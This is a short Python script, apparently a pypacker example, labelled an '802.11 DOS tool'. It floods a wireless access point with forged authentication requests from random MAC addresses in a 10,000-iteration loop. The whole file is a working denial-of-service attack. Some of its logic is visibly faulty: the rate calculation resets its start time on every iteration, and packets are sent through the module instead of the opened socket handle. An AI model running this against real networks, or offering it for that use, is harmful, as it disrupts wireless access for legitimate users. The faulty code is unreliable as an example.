"""802.11 DOS tool"""

from pypacker import pypacker
from pypacker.layer12 import ieee80211, prism
from pypacker import psocket
import time

# name of monitor interface to use
wlan_monitor_if	= "prism0"
# MAC address of access point
ap_mac		= "00:11:22:33:44:55"
mon_sock	= psocket.SocketHndl(wlan_monitor_if)

auth_req	= prism(len=24) +\
		ieee80211.IEEE80211(type=ieee80211.MGMT_TYPE, subtype=ieee80211.M_AUTH, to_ds=1, from_ds=0) +\
		ieee80211.IEEE80211.MGMTFrame(dst_s=ap_mac, bssid_s=ap_mac) +\
		ieee80211.IEEE80211.Auth(auth_seq=1)

print("starting DOS attack on AP %s" % ap_mac)

for i in range(10000):
	start_time = time.time()

	if i % 100 == 0:
		diff = time.time() - start_time
		print("%d pps" % (100 / diff) )

	try:
		auth_req[ieee80211.IEEE80211.MGMTFrame].src = pypacker.get_rnd_mac()
		psocket.send(auth_req.bin())
	except Exception as e:
		mon_sock.close()
		print(e)
